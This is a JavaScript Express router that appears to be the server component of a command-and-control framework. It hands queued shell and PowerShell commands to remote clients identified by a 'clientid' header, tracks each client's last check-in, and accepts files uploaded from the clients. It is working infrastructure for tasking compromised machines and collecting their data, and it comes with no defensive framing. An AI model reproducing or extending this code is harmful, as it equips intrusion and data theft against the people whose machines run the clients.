const router = require('express').Router();
const Command = require('../commands.model');
const Utils = require('../../Utils/utilFunctions');
const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
const psCommand = require('../pscommand.model');
const formidable = require('express-formidable');
const Client = require('../../Clients/client.model')
const ClientUtils = require("../../Utils/clientUtils");
const base64Decode = require('../../Utils/MiddleWears/base64')
const express = require("express");
const {LogToFile} = require("../../Utils/utilFunctions");

router.use(toolCookieValidator);
router.use(base64Decode);
router.use(express.json());


//Give client a command + update check in
router.route('/h2').get((req, res) => {
    try {
        let clientId = req.headers['clientid'];
        Command.findOneAndDelete({client_id: clientId}, function (err, command) {
            if (err) {
                Utils.LogToFile(`Error getting command for client ${err} from database`);
                res.send("No command");
            } else {
                if (command) {
                    if (command['command'] === "exit")
                        ClientUtils.RemoveClient(clientId)
                    res.send(Utils.base64Encode(command['command']))
                } else {
                    res.send(Utils.base64Encode("No command"))
                }
            }
            Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false}, function (err) {
                if (err)
                    Utils.LogToFile(`Error updating last active for client ${clientId}`)
            })
        })
    } catch (err) {
        Utils.LogToFile(`Error getting command for client ${err}`);
        res.send("No command");
    }

});


//get a powershell command
router.route('/ps').post((req, res) => {
    try {
        let clientId = req.headers['clientid'];
        psCommand.findOneAndDelete({client_id: clientId}, function (err, command) {
            if (err) {
                Utils.LogToFile(`Error getting ps command for client ${err} from database`);
                res.send("No command");
            } else {
                if (command) {
                    res.send(command['command']);
                } else {
                    res.send("No command");
                }
            }
        })
        Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false}, function (err) {
            if (err)
                Utils.LogToFile(`Error updating last active for client ${clientId}`)
        })
    } catch (err) {
        Utils.LogToFile(`Error getting ps command for client ${err}`);
        res.status(400).send("No command");
    }
});


router.use(formidable())

router.route('/upload').post((req, res) => {
    console.log(req.headers)
    LogToFile(`Received file from client`);
    console.log(req.files.fileUpload.path, req.files.fileUpload.name)
    Utils.MoveFile(req.files.fileUpload.path, req.files.fileUpload.name, req.headers['clientid'])
    res.send("Done")
})

module.exports = router;
